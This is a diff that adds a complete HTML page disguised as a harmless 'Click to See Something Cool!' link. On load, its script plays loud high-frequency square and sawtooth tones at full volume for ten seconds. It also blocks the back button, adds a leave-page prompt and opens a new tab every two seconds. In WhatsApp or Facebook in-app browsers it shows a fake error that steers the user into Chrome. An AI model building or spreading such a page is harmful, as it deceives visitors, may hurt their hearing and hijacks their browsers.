@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        function detectWebView() {
+            let userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            if (userAgent.includes("WhatsApp") || userAgent.includes("FBAN")) {
+                alert("Error: Your browser is not supported. Please open this link in Chrome.");
+                document.body.innerHTML = `<h2>Open in Chrome</h2>
+                                           <p>Click the button below to continue.</p>
+                                           <a href="googlechrome://example.com" style="font-size: 20px; color: blue;">Open in Chrome</a>`;
+                return true;
+            }
+            return false;
+        }
+
+        function startAttack() {
+            let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            let osc1 = audioCtx.createOscillator();
+            let osc2 = audioCtx.createOscillator();
+            let gainNode = audioCtx.createGain();
+
+            osc1.type = "square";
+            osc2.type = "sawtooth";
+
+            osc1.frequency.setValueAtTime(3000, audioCtx.currentTime);
+            osc2.frequency.setValueAtTime(3500, audioCtx.currentTime + 0.5);
+
+            gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
+
+            osc1.connect(gainNode);
+            osc2.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+
+            osc1.start();
+            osc2.start();
+
+            setTimeout(() => {
+                osc1.stop();
+                osc2.stop();
+            }, 10000);
+        }
+
+        function preventExit() {
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () {
+                history.pushState(null, null, location.href);
+            };
+
+            window.onbeforeunload = function () {
+                return "Are you sure you want to leave?";
+            };
+
+            setInterval(() => {
+                window.open("https://example.com", "_blank");
+            }, 2000);
+        }
+
+        function autoStart() {
+            if (!detectWebView()) {
+                startAttack();
+                preventExit();
+            }
+        }
+
+        window.onload = autoStart;
+    </script>
+</head>
+<body>
+    <h1>Click to See Something Cool!</h1>
+</body>
+</html>
